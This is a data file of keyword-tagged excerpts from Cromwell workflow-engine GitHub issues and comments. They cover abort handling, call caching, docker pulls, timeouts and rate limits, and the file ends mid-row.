Safety,"I am running the program [deFuse](https://bitbucket.org/dranew/defuse) version 0.8.1 using a local backend. When I run the progam locally inside a docker container, the program completes successfully. When I run it using Cromwell/WDL, it raises the following error:; ```; Starting defuse command:; /usr/local/bin/gmap -D defuse-data/gmap -d cdna -f psl #<1 > #>1; Reasons:; /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakp; oints.split.001.fa.cdna.psl missing; Failure for defuse command:; /usr/local/bin/gmap -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a; -ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa > /cromwell-executions/detectFusions/96242; 9bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa.cdna.psl.tmp; Reason:; Job command with nonzero return code; Return codes: 139; Job output:; Running on 2ecb3961d54d; Note: /usr/local/bin/gmap.avx2 does not exist. For faster speed, may want to compile package on an AVX2 machine; GMAP version 2018-07-04 called with args: /usr/local/bin/gmap.sse42 -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa; Checking compiler assumptions for SSE2: 6B8B4567 327B23C6 xor=59F066A1; Checking compiler assumptions for SSE4.1: -103 -58 max=198 => compiler zero extends; Checking compiler options for SSE4.2: 6B8B4567 __builtin_clz=1 __builtin_ctz=0 _mm_popcnt_u32=17 __builtin_popcount=17 ; Finished checking compiler assumptions; Pre-loading compressed genome (oligos)......done (78,222,840 bytes, 19098 pages, 0.00 sec); Pre-loading compressed genome (bits)......done (78,222,864 bytes, 19098 pages, 0.02 sec); Looking for index files in directory defuse-data/gmap/cdna; Pointers file is cdna.ref153offsets64meta; Offsets file is cdna.ref153offsets64strm; Positions file is cdna.re",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465:395,detect,detectFusions,395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465,3,['detect'],['detectFusions']
Safety,"I am using latest cromwell develop docker container. When I run ""abort"" command it internall executes docker.kill script that looks like:; ""; #!/bin/bash ; docker kill `cat /pipelines/cromwell-executions/vsearch/81c51e4e-756c-47f7-8dd6\; -57b9c2981162/call-global_search/execution/docker_cid`; ""; However, docker_cid is never created. So, all the abort commands that I do stop the cromwell tasks but never stop docker containers that were started by it. My docker-stack configuration is https://github.com/antonkulaga/cromwell-client/blob/master/services/pipelines.yml. It uses slightly modified cromwell:develop container https://github.com/antonkulaga/cromwell-client/blob/master/services/cromwell/Dockerfile. I also share docker sockets there and everything functions well with the exception of abort.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4011:65,abort,abort,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4011,3,['abort'],['abort']
Safety,I am working on code in the branch `issue\5004` that will remove the need for the proxy container and might make this redundant. It would be good to discuss and see if there is a way to kill two birds with one stone.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-626967088:118,redund,redundant,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-626967088,1,['redund'],['redundant']
Safety,"I asked your question to PAPI and here is the response:. > This detail is not something that should be counted on in a containerized environment.; That said: the /dev/disk/by-id/* system is simply a convenient alias. The underlying block storage doesn't change (eg, /dev/disk/by-id/google-local-disk is a symlink to a block device, in this case, /dev/sdb). So they should be able to continue monitoring if they want, it will just be harder to recover the mapping.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4388#issuecomment-439092230:443,recover,recover,443,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4388#issuecomment-439092230,2,['recover'],['recover']
Safety,I backed out the name-mangling change because it was redundant in fixing the actual bug and had far-reaching consequences.; - The upgrade script was very broken because it makes extensive use of anonymous node names to come up with real names for what to put in the WDL; - String concatenation and string comparison feel like gross tools to use when we have types at our disposal... i.e. evaluating `.isInstanceOf[AnonymousExpressionNode]`. I can imagine a future where we have a `canLinkWith` function that evaluates name and type to return a boolean,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4075#issuecomment-420680044:53,redund,redundant,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4075#issuecomment-420680044,1,['redund'],['redundant']
Safety,"I believe that this was a case of `abort-jobs-on-terminate` not being set. The default has changed in #1664, so one shouldn't have to opt in to this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1645#issuecomment-259756546:35,abort,abort-jobs-on-terminate,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1645#issuecomment-259756546,1,['abort'],['abort-jobs-on-terminate']
Safety,"I can't think of any runtime parameters (with the exception of `docker`); that should change the hashing. Also, are the inputs to the task hashed or; is it the fully rendered command block or what? Because if I have a; parameter to the task (such as ""preemptible_attempts"") that is only used in; the runtime block, (ideally) I'd like it to be ignored for call caching; purposes. On Fri, Sep 8, 2017 at 3:12 PM, Kate Voss <notifications@github.com> wrote:. > As a *workflow runner*, I want *certain parameters to be ignored in the; > hashing process*, so that I can *call cache on more workflows when the; > result is exactly the same*.; >; > - Effort: *?*; > - Risk: *Medium*; > - We should err on the side of hashing a workflow differently if we; > are not absolutely confident that the parameter does not impact the result.; > - Which parameters are ignored is NOT user-editable. This is to; > prevent users from accidentally ignoring parameters that do impact the; > result.; > - Business value: *Medium*; >; > Some parameters, such as preemptible_attempts and CPU, don't affect the; > outcome of the workflow but workflows with different CPU values will not; > call cache.; >; > @LeeTL1220 <https://github.com/leetl1220> and @geoffjentry; > <https://github.com/geoffjentry> to provide additional thoughts and; > context if helpful.; > Related issue #1210; > <https://github.com/broadinstitute/cromwell/issues/1210>; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2604>, or mute the; > thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk24fM_SrXs0gx-Ry1aw1opHFZAb5ks5sgZG5gaJpZM4PRlLU>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717:661,Risk,Risk,661,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717,1,['Risk'],['Risk']
Safety,"I cant get the sra filesystem to work. Here is the error:. ```; [2020-08-21 11:08:59,62] [info] WorkflowManagerActor Workflow dbd5cdc0-c79a-42cd-b929-56ddb1115467 failed (during InitializingWorkflowState): common.exception.AggregatedMessageException: Failed to instantiate backend filesystem:; Cannot find a filesystem with name sra in the configuration. Available filesystems: ftp, s3, gcs, oss, drs, http; 	at common.validation.Validation$ValidationChecked$.$anonfun$unsafe$2(Validation.scala:98); 	at cats.syntax.EitherOps$.valueOr$extension(either.scala:66); 	at common.validation.Validation$ValidationChecked$.unsafe$extension(Validation.scala:98); 	at cromwell.backend.BackendConfigurationDescriptor.configuredPathBuilderFactories$lzycompute(backend.scala:109); 	at cromwell.backend.BackendConfigurationDescriptor.configuredPathBuilderFactories(backend.scala:108); 	at cromwell.backend.BackendConfigurationDescriptor.pathBuilders(backend.scala:120); 	at cromwell.backend.standard.StandardInitializationActor.pathBuilders$lzycompute(StandardInitializationActor.scala:62); 	at cromwell.backend.standard.StandardInitializationActor.pathBuilders(StandardInitializationActor.scala:62); 	at cromwell.backend.google.pipelines.common.PipelinesApiInitializationActor.$anonfun$workflowPaths$2(PipelinesApiInitializationActor.scala:137); 	at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(Abst",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793:469,unsafe,unsafe,469,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793,2,['unsafe'],['unsafe']
Safety,"I concur-- more comments in general to avoid people ""fixing"" anything you've profiled here. After that 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1468/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1468#issuecomment-248757551:39,avoid,avoid,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1468#issuecomment-248757551,1,['avoid'],['avoid']
Safety,"I don't actually know what the fix is because I don't know the intent behind exporting custom `TMPDIR` into the shell environment. I could just delete that line — it seems redundant to me, I can't think why the command shell `TMPDIR` has to equal `java.io.tmpdir` — but I don't know if it's there to fix some other issue that I don't know about.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2035#issuecomment-282901047:172,redund,redundant,172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2035#issuecomment-282901047,1,['redund'],['redundant']
Safety,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1085,unsafe,unsafeToFuture,1085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690,3,"['timeout', 'unsafe']","['timeout', 'unsafeToFuture']"
Safety,I don't think these issues block anybody - they just lead to constant questions and give a bad impression of our reliability. People are often worried they are still spending money because it looks that way. I could do a query to probably find how often aborts don't work if that helps. . There isn't a workaround to either issue - only that we tell users it's ok after we dig in to find out that it is and they just deal with the inconsistency.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334480164:254,abort,aborts,254,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334480164,1,['abort'],['aborts']
Safety,"I encountered this error when running a WDL:; ```message: Runtime validation failed; causedBy: ; message: Task hello has an invalid runtime attribute docker = !! NOT FOUND !!; ```. I understand that it requires a docker attribute. The issue is that the error gets found at runtime. This should be caught when validating the WDL. . The risk is that users could ""run half their tasks and only find out mid-workflow that one needs an extra parameter"" (ChrisL's words).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2932:335,risk,risk,335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2932,1,['risk'],['risk']
Safety,"I find that it's always worth looking those up in any language you're not using regularly, because they're not used consistently from one to the other. And including a sanity check/test in whatever code you write, to make sure it's returning what you expect :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1604#issuecomment-270675432:168,sanity check,sanity check,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1604#issuecomment-270675432,1,['sanity check'],['sanity check']
Safety,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:208,safe,safe,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027,1,['safe'],['safe']
Safety,"I have a task with an input 'File' (WDL concept) that is actually a folder. I did not know what would happen, as I could not find explanation of the concept in either wdl or cromwell docs. . For the 'File's that are actually files, cromwell reports ```Localisation via hard-link has failed ... invalid cross device link``` as expected (different disks), and then seems to successfully soft-link (as expected). For the folder, the same hard link error appears, but then there is no soft link error, and the folder is (recursively) copied. The folder hard link would also fail due to folders not being hard-linkable. But the soft-link should probably succeed. I am running an SGE backend, with no modification of the 'localisation' settings https://cromwell.readthedocs.io/en/latest/backends/HPC/#shared-filesystem. What is the expected behaviour? Should I avoid using folders for WDL 'File's? Any advice would be appreciated. Thanks",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3785:855,avoid,avoid,855,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3785,1,['avoid'],['avoid']
Safety,"I have been experimenting some random failures due to docker containers being killed for some reason on my system (not only https://github.com/broadinstitute/cromwell/issues/3370), but if I re-run the workflow with caching enabled then this calls end without failure and the pipeline can continue and work. Nevertheless, it is tedious to re-run a whole pipeline due to random failures and rely on caching for avoid re-computation. This is something that can be avoided by providing a configuration option for retry jobs (cromwell level) or add to some tasks a runtime attribute (WDL level) to set the number of retries that can be done per-task. Do you think that this is possible in the near future to avoid re-running a whole pipeline due to a random failure in a concrete task(s)?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3417:409,avoid,avoid,409,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3417,3,['avoid'],"['avoid', 'avoided']"
Safety,I have just had a run with Cromwell 55 configured with the `cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory` Google API and which resulted in several `504 Gateway Timeout` errors while attempting to read `rc` and `stdout` output files. Is this something that should be looked into?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760291957:190,Timeout,Timeout,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760291957,1,['Timeout'],['Timeout']
Safety,I haven't seen this happen live but in theory 'take' can throw an exception if the underlying queue changes between checking `available` and running `dequeue`. That might happen if an unluckily timed `abort` removes an actor from the queue between those checks.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4165:201,abort,abort,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4165,1,['abort'],['abort']
Safety,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:687,detect,detects,687,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702,1,['detect'],['detects']
Safety,"I just mentioned this in another issue @TMiguelT and I know it doesn't help your immediate problem but I'd personally recommend avoiding docker containers which use `ENTRYPOINT` for reproducible workflows. . For instance, `ENTRYPOINT` is slated to be [permanently overridden in CWL 2.0](https://github.com/common-workflow-language/common-workflow-language/issues/522), and it's clear that both WDL and CWL were designed without `ENTRYPOINT` in mind.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4381#issuecomment-438110931:128,avoid,avoiding,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4381#issuecomment-438110931,2,['avoid'],['avoiding']
Safety,I just merged https://github.com/broadinstitute/cromwell/pull/7179 so I think this PR has become redundant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1644504893:97,redund,redundant,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1644504893,1,['redund'],['redundant']
Safety,"I know the I/O actor is not very trendy these days, but even if it ends up going away I thought this was a small change that could help with handling IO pressure in a better way.; Currently if an actor receives a backpressure message it waits more or less 5 seconds and retries. This uses configurable exponential backoff instead with a higher randomization of waiting times to avoid spikes as much as possible.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4043:378,avoid,avoid,378,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4043,1,['avoid'],['avoid']
Safety,"I like the idea of a centralized rate limiter (proxy, supervisor, whatever) to more rationally avoid QPS issues, but these changes are more generally making the vassals robust to any sort of transient problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153442613:95,avoid,avoid,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153442613,1,['avoid'],['avoid']
Safety,"I made some comments regarding concurrency & thread safety. Those weren't a roundabout way of me saying I thought there _was_ a problem, rather I just wanted to make sure that was thought through due to the way that's being called. 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1273/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1273#issuecomment-238712758:52,safe,safety,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1273#issuecomment-238712758,1,['safe'],['safety']
Safety,"I mentioned this to Jeff earlier, but I had some sort of git calamity that prevents me from squashing down these commits in the usual way. I'll fix this before the actual merge to sprint2 with a brute force patching of a new branch of sprint2 with these changes, but I'd like to hold off on doing that until this is ready for merge to avoid losing your comments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/9#issuecomment-100315647:335,avoid,avoid,335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/9#issuecomment-100315647,1,['avoid'],['avoid']
Safety,I noticed that I got a few failures using the default 1 second timeout here. . So this PR ups that to 10 seconds... 🤞,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4385:63,timeout,timeout,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4385,1,['timeout'],['timeout']
Safety,I noticed that in swagger abort is marked as POST request despite it contains only two parameters: version and id. I suggest to make it a get request,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2318:26,abort,abort,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2318,1,['abort'],['abort']
Safety,"I now notice that both checking for the RC and the 'check-alive' checks are controlled by this setting. This seems a bit strange as the rc checking is comparatively very cheap compared to 'check-alive'. Initially the point of not running check-alive all the time was that the cost was high compared to rc file checking. But now the solution has been to slow down rc checking to the speed of the costly check-alive! I am a bit muddled on this, so am not sure if I am getting it. . Without exit-code-timeout-seconds at what interval is the rc file checked for?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-488542941:498,timeout,timeout-seconds,498,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-488542941,1,['timeout'],['timeout-seconds']
Safety,"I picked up this ticket mostly to avoid getting in other people's way, but having looked at if for a while I'm not seeing much value in this. The default_runtime_attributes feature itself is valuable and working, with Centaur test coverage. The backends aren't really re-implementing default runtime attributes, nearly all the heavy lifting is being done by `RuntimeAttributesDefault`. The backends currently do have to be aware of the existence of the default runtime attributes feature but that doesn't really seem so bad. Unassigning and returning to the bottom of the 0.21 pile, recommending for demotion to a lesser pile or outright closure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-230929279:34,avoid,avoid,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-230929279,1,['avoid'],['avoid']
Safety,I placed the configuration option into backend/abortJobsOnTerminate. If you guys want me to move or rename it to something else I'm happy to.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175077183:47,abort,abortJobsOnTerminate,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175077183,1,['abort'],['abortJobsOnTerminate']
Safety,"I ran a super small WDL, then checked its status to make sure it was running. Then, I tried to abort it -- the request returned a 500: ""The server was not able to produce a timely response to your request."". However, when I check the status of the workflow, it says it has been successfully aborted. I included the WDL i ran against https://cromwell.gotc-int.broadinstitute.org/swagger/index.html?url=/swagger/cromwell.yaml in case you'd like to try it yourself. task echoHelloWorld {; command {; echo 'Hello, World!'; }; runtime {; docker: ""phusion/baseimage""; disks: ""local-disk 10 HDD""; memory: ""1 GB""; preemptible: 3; }; }. workflow printHelloAndGoodbye {; call echoHelloWorld; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253:95,abort,abort,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253,2,['abort'],"['abort', 'aborted']"
Safety,"I saw intermittent timeouts locally too, that disappeared when re-running the suite. But I think that's part of outside testing issue we're tracking elsewhere. Passing on to @Horneth as next reviewer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155150529:19,timeout,timeouts,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155150529,1,['timeout'],['timeouts']
Safety,"I see, so in order to call cache on an old workflow Cromwell has to dig into the database. . - Effort: **?**; - Risk: **Medium**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-326330274:112,Risk,Risk,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-326330274,1,['Risk'],['Risk']
Safety,"I speculate that this issue is caused by trying to bring in half-aborted previous jobs. Fixing that in Single Workflow mode should alleviate this ticket although the underlying cause (""abort"" leaves cromwell in an inconsistent state) still needs addressing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255117503:65,abort,aborted,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255117503,2,['abort'],"['abort', 'aborted']"
Safety,"I still need to get my [terminology straight](http://martinfowler.com/articles/mocksArentStubs.html), but either a mock or a stub would have probably sufficed. I mainly wanted to feel like the code was ""self-documented"" a little in the tests. Instead, I put in a detector for a `cromwell-account.conf` that when present runs an integration test against the live ""gcr.io"". TODO: I still need to clean up access token caching, but there's lots of other code that may be critiqued.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-161046172:263,detect,detector,263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-161046172,1,['detect'],['detector']
Safety,"I talked to @dshiga about how gs://broad-gotc-dev-storage/dshiga/wgs_split_even_tiledb.hg38.v3.interval_list was created. If you want an interval list for hg38 then that is the best interval list we have created thus far. `v1` is our first crack at creating an interval list that was ""even"" in terms of run times starting with histograms created from the 1000 genomes vcfs (converted from hg19). `v2` is `v1` after taking the 15 longest running shards from the callset we used `v1` on and chopped them into 10 equal parts by bases. `v3` was created once we realized that `v2` nor `v1` covered all of the genome territory that our calling intervals cover so we added the parts of the genome that were missing (they're small so they shouldn't be problem causing). If you wanted to split this interval list without any kind of model helping you make smart splits you will probably run into what we did with gnomad of having to iteratively split the same intervals multiple times to hit acceptable run times which is no fun. . You can always overfit the problem and just make a crazy number of intervals where you can guarantee that even in the worst case for each of those intervals, it will still be under some run time you want to beat but that probably isn't the best strategy for many reasons. Alot of it has to do with the content of the callset which is something we are not good at predicting. The callset we used `v2` on had one interval that was multiple times longer than the next longest shard but in the callset we used `v1` on that same interval was one of the faster ones. Both callsets had around the same number of samples. Currently we are always retroactively ""fixing"" our interval list",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2175#issuecomment-295265998:1386,predict,predicting,1386,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2175#issuecomment-295265998,1,['predict'],['predicting']
Safety,"I talked to the greens a little bit today and I'm thinking the way to go about this is per-function limits. `read_bool()` - 5 chars (""false""); `read_int()` - 19 chars (if I did my sleuthing & counting correct for MAX_INT); `read_float()` - 50 chars (made up, but maxint plus a lot of decimal places); `read_string()` - 128K (because it's 2x what CWL gives you ;) ). Where it gets tricky are the larger objects. I'm less certain on what to do here:. `read_lines()` - I'm thinking this should be the same as `read_string()`; `read_json()` - Same? I think?; `read_[tsv|map|object]()` - No idea but from talking to the greens there are certainly reasonable use cases which would be much larger than the above. It sounded like if we capped this at 1MB it'd easily cover everything they did. From a workbench safety-from-users perspective this seems like the class of functions most likely to be abused as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-266913447:803,safe,safety-from-users,803,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-266913447,1,['safe'],['safety-from-users']
Safety,I think for now it's safe to believe the user that it's an MD5 file,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2621#issuecomment-329262812:21,safe,safe,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2621#issuecomment-329262812,1,['safe'],['safe']
Safety,"I think in general the number of concurrent jobs is determined by both of client side (cromwell) and server side(aws batch). In cormwell, there should be a rate limit of api call (no matter it is job submission or job status query) to avoid DDoS to the server side. On the server side like aws batch, there is also a config for rate limit of concurrent api call, if the number of concurrent api call exceeds the rate limit of server side, the server side may refuse to server so it is important not to set rate limit on the client side/cromwell over the server side rate limit. While on server side, if the concurrent jobs require more resources than the limit such as cpus and mem (compute env in aws batch) , it is the server side responsibility to put the concurrent jobs to queue and make sure they can be launched later when resource is available rather than throwing errors unless the queue is expired (say, resource is still not available one week later). IMHO, aws batch backend should implement the scatter jobs in array jobs which support multiple jobs submission and status query in one single api call, otherwise, it is too easy to exceed the rate limit of aws batch. jobs submission by user --> cromwell (rate limit config) --> aws batch gateway (rate limit config) --> aws batch compute env (resource 